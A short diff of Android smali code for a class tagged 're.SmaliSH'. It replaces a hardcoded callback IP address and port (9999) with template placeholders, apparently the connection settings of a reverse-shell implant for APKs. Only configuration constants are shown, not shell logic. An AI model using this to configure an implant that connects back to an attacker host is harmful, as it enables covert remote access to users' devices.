@@ -11,9 +11,9 @@
 
 .field public static final TAG:Ljava/lang/String; = "re.SmaliSH"
 
-.field public static final TARGET:Ljava/lang/String; = "185.227.110.50"
+.field public static final TARGET:Ljava/lang/String; = "{SMALISH_ADDRES}"
 
-.field public static final TARGET_PORT:I = 0x270f
+.field public static final TARGET_PORT:I = {SMALISH_PORT}
 
 .field public static final VERBOSE:Z = true
 
